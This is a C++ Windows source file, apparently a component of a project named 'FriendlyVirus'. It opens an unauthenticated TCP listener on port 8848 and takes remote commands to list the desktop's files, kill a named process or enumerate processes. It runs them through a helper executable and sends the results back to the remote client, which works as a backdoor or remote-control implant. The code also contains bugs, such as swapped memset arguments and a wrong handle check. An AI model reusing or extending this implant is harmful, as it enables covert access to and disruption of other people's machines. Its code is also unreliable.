#include "pch.h"
#include <iostream>
#include<WinSock2.h>
#include<Windows.h>
#include<WS2tcpip.h>
#include"../FriendlyVirus/FriendlyVirus.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"../debug/FriendlyVirus.lib")

;
//全局变量，邮槽句柄指针
HANDLE *hMailslot;


void CombineString(WCHAR** des, WCHAR* src_0, char *src_1, char *src_2, int *size) {
	int size_ = 0;
	*size = lstrlen(src_0) * sizeof(WCHAR) + (3 + strlen(src_1) + strlen(src_2)) * sizeof(WCHAR);
	WCHAR *src_0_temp = src_0;
	CHAR *src_1_temp = src_1;
	CHAR *src_2_temp = src_2;
	*des = (WCHAR*)malloc(*size);
	memset(*des, *size, '\0');
	WCHAR *desTmp = *des;

	while (*src_0_temp) {
		*desTmp = *src_0_temp;
		(desTmp)++;
		src_0_temp++;
	}
	*desTmp = (WCHAR)' ';
	(desTmp)++;
	while (*src_1_temp) {
		*desTmp = (WCHAR)*src_1_temp;
		(desTmp)++;
		src_1_temp++;
	}
	*desTmp = (WCHAR) ' ';
	(desTmp)++;
	while (*src_2_temp) {
		*desTmp = (WCHAR)*src_2_temp;
		(desTmp)++;
		src_2_temp++;
	}
	*desTmp = (WCHAR) '\0';
}

//函数重载
void CombineString(WCHAR** des, WCHAR* src_0, char *src_1, int *size)
{
	int size_ = 0;
	*size = lstrlen(src_0) * sizeof(WCHAR) + (2 + strlen(src_1)) * sizeof(WCHAR);
	WCHAR *src_0_temp = src_0;
	CHAR *src_1_temp = src_1;
	*des = (WCHAR*)malloc(*size);
	memset(*des, *size, '\0');
	WCHAR *desTmp = *des;

	while (*src_0_temp) {
		*desTmp = *src_0_temp;
		(desTmp)++;
		src_0_temp++;
	}
	*desTmp = (WCHAR)' ';
	(desTmp)++;
	while (*src_1_temp) {
		*desTmp = (WCHAR)*src_1_temp;
		(desTmp)++;
		src_1_temp++;
	}
	*desTmp = (WCHAR) '\0';
}

void GetTotalBytes(WCHAR** des,int *totalBytes) {
	*totalBytes = 0;
	WCHAR** copyDes = des;
	while (*copyDes) {
		*totalBytes += lstrlen(*copyDes) * sizeof(WCHAR);
		copyDes++;
	}
}

VOID JudgeSuccessOrNot(bool result) {
	if (result) {
		printf("指令执行成功!\n");
	}
	else {
		printf("指令执行失败，error:%d\n", GetLastError());
	}
};
//创建邮槽，便于进程间的通信
HANDLE* CreateMyMailslot() {
	HANDLE* hMailslot=(HANDLE*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sizeof(hMailslot));
	*hMailslot = CreateMailslot(L"\\\\.\\mailslot\\lzq",//邮槽名称可能要改动，多线程时可能创建相同的
		1000, 0, NULL);
	if (hMailslot==INVALID_HANDLE_VALUE) {
		printf("创建邮槽失败!error:%d\n", GetLastError());
		return NULL;
	}
	else {
		printf("创建邮槽成功!\n");
		return hMailslot;
	}
}

DWORD WINAPI ThreadProc(LPVOID lpParam) {
	SOCKET answerSocket = (SOCKET)lpParam;
	CHAR recvBuff[512];
	int bytesRecv = 0;
	int threadId = GetCurrentThreadId();
	WCHAR exeName[] = L"RemoteOperation.exe";
	BOOL bCreateProcessResult = 0;
	STARTUPINFO strtinfo;
	PROCESS_INFORMATION processInformation;
	WCHAR* totalMessage = NULL;
	WCHAR* totalMessageTmp = NULL;
	LPWSTR* message = NULL;
	LPWSTR* messageTmp = NULL;
	WCHAR* exeNameAndCmdLine = NULL;
	int cbnsize = 0;
	char tmpName[100];
	int bytesSend = 0;
	WCHAR answerWord[] = L"Recieved Success!";
	ZeroMemory(&strtinfo, sizeof(strtinfo));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	printf("线程[%d]已启动!\n", threadId);
	while (true)
	{
		printf("线程[%d]等待数据传入......\n",threadId);
		Sleep(2000);
		ZeroMemory(recvBuff, 512);
		bytesRecv = recv(answerSocket, recvBuff, 512, 0);
		if (bytesRecv == SOCKET_ERROR) {
			closesocket(answerSocket);
			break;
		}
		else {
			if (strcmp(recvBuff, "\\c") == 0 || strcmp(recvBuff, "\\close") == 0) {
				printf("线程[%d]已结束\n",threadId);
				//CloseHandle(hMailslot);
				closesocket(answerSocket);
				break;
			}
			printf("线程[%d]接收到数据:%s\n",threadId,recvBuff);
			
			if (strcmp(recvBuff, "desktopfile") == 0) {
				ZeroMemory(tmpName, 100);
				CopyMemory(tmpName, "desktopfile",11);
				CombineString(&exeNameAndCmdLine, exeName, tmpName,&cbnsize);
				bCreateProcessResult = CreateProcess(NULL,exeNameAndCmdLine, NULL, NULL, FALSE, 0, 
					NULL, NULL, &strtinfo,&processInformation);
				JudgeSuccessOrNot(bCreateProcessResult);
				message = GetMessageFromMailslot(*hMailslot); 
				messageTmp = message;
				if (*messageTmp) {
					int totalBytes = 0;
					GetTotalBytes(messageTmp, &totalBytes);
					if (totalBytes != 0) {
						totalMessage = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalBytes+totalBytes/sizeof(WCHAR));
						totalMessageTmp = totalMessage;
					}
					WCHAR slipChar = '\n';
					while (*messageTmp) {
						while (**messageTmp) {
							*totalMessageTmp = **messageTmp;
							totalMessageTmp++;
							(*messageTmp)++;
						}
						*totalMessageTmp = slipChar;
						totalMessageTmp++;
						messageTmp++;
					}
					*totalMessageTmp = '\0';
				}
				bytesSend = send(answerSocket, (CHAR*)totalMessage, (lstrlen(totalMessage) + 1) * sizeof(WCHAR), 0);
				
				//发送数据回客户端
				if( bytesSend == SOCKET_ERROR) {
					printf("数据发送失败!%d\n",WSAGetLastError());
					WCHAR errorMsg[] = L"数据发送失败!";
					if (send(answerSocket, (char*)errorMsg, (lstrlen(errorMsg) + 1) * 2, 0) == SOCKET_ERROR) {
						printf("xxx\n");
					}
				}
				else {
					printf("数据发送成功,共发送%d字节数据!\n",bytesSend);
				}
				
				HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, message);
				HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, totalMessage);
				CloseHandle(processInformation.hThread);
				CloseHandle(processInformation.hProcess);
			}
			else if (strcmp(recvBuff, "kill") == 0) {
				printf("继续接受指令\n");
				Sleep(500);
				recv(answerSocket, recvBuff, 512, 0);
				//构造命令行，使目标函数执行相关操作
				ZeroMemory(tmpName, 100);
				CopyMemory(tmpName, "kill", 4);
				CombineString(&exeNameAndCmdLine, exeName, tmpName, recvBuff, &cbnsize);
				CreateProcess(NULL, exeNameAndCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &strtinfo, &processInformation);
				JudgeSuccessOrNot(bCreateProcessResult);
				message = GetMessageFromMailslot(*hMailslot);
				messageTmp = message;
				if (*messageTmp) {
					int totalBytes = 0;
					GetTotalBytes(messageTmp, &totalBytes);
					if (totalBytes != 0) {
						totalMessage = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalBytes + totalBytes / sizeof(WCHAR));
						totalMessageTmp = totalMessage;
					}
					WCHAR slipChar = '\n';
					while (*messageTmp) {
						while (**messageTmp) {
							*totalMessageTmp = **messageTmp;
							totalMessageTmp++;
							(*messageTmp)++;
						}
						*totalMessageTmp = slipChar;
						totalMessageTmp++;
						messageTmp++;
					}
					*totalMessageTmp = '\0';
				}
				bytesSend = send(answerSocket, (CHAR*)totalMessage, (lstrlen(totalMessage) + 1) * sizeof(WCHAR), 0);

				//发送数据回客户端
				if (bytesSend == SOCKET_ERROR) {
					printf("数据发送失败!%d\n", WSAGetLastError());
					WCHAR errorMsg[] = L"数据发送失败!";
					if (send(answerSocket, (char*)errorMsg, (lstrlen(errorMsg) + 1) * 2, 0) == SOCKET_ERROR) {
						printf("xxx\n");
					}
				}
				else {
					printf("数据发送成功,共发送%d字节数据!\n", bytesSend);
				}

				HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, message);
				HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, totalMessage);
				CloseHandle(processInformation.hThread);
				CloseHandle(processInformation.hProcess);
			}
			else if (strcmp(recvBuff, "processes") == 0) {
				ZeroMemory(tmpName, 100);
				CopyMemory(tmpName, "processes", 10);
				CombineString(&exeNameAndCmdLine, exeName, tmpName, recvBuff, &cbnsize);
				CreateProcess(NULL, exeNameAndCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &strtinfo, &processInformation);
			}
			else {
				send(answerSocket,(char*)answerWord, (lstrlen(answerWord) + 1)*sizeof(WCHAR), 0);
			}
		}
	}
	return 0;
}

int main()
{
	ADDRINFO addInfo;
	ADDRINFO *result=nullptr;
	SOCKET answerSocket;
	WSADATA wSaData;
	int nStartRet = 0;
	int nGetAddrRet = 0; 
	int nBindRet = 0;
	int nListenRet = 0;
	SOCKET listenSocket;
	//创建邮槽便于本程序与其创建的进程间的数据交换
	hMailslot = CreateMyMailslot();
	nStartRet = WSAStartup(MAKEWORD(2, 2), &wSaData);
	if (nStartRet != 0) {
		printf("WSAStartup（）failed!error:%d\n", WSAGetLastError());
		return -1;
	}
	ZeroMemory(&addInfo, sizeof(addInfo));
	addInfo.ai_family = AF_INET;
	addInfo.ai_socktype = SOCK_STREAM;
	addInfo.ai_protocol = IPPROTO_TCP;
	addInfo.ai_flags = AI_PASSIVE;
	nGetAddrRet = getaddrinfo(NULL, "8848", &addInfo, &result);
	if (nGetAddrRet!=0)
	{
		printf("getaddrinfo() failed!error:%d\n", WSAGetLastError());
		return -1;
	}
	listenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (listenSocket == INVALID_SOCKET) {
		printf("socket() failed!error:%d\n", WSAGetLastError());
		return -1;
	}
	nBindRet = bind(listenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (nBindRet != 0) {
		printf("bind() failed!error:%d\n", WSAGetLastError());
		return -1;
	}
	printf("正在监听....\n");
	nListenRet = listen(listenSocket, 1);
	if (nListenRet != 0) {
		printf("监听失败!error:%d\n", WSAGetLastError());
		return -1;
	}
	while (true)
	{
		answerSocket = accept(listenSocket,NULL,NULL);
		if (answerSocket==INVALID_SOCKET)
		{
			break;
		}
		CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
			(void*)answerSocket, 0, nullptr);
		
	}
}